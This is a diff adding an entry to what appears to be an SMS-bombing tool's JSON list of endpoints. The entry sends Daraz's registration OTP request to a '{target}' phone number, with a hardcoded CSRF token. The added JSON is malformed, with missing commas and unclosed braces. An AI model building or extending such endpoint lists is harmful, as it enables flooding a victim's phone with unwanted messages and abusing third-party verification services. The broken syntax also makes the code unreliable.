@@ -7,6 +7,21 @@
     "version": "2.3",
     "sms": {
         "91": [
+
+
+            {
+                "name":"Daraz",
+                "method":"POST",
+                "url":"https://member.daraz.com.np/user/api/sendVerificationSms",
+                "data":{ 
+                         "phone":"{target}"
+                         "type":"OTP_REGISTER",
+                         "lzdAppVersion":"1.0",
+                         "X-CSRF-TOKEN":"57343b8557abe",
+                         "ncToken":{
+                                      "" 
+                                   }
+                        
             {
                 "name": "confirmtkt",
                 "method": "GET",
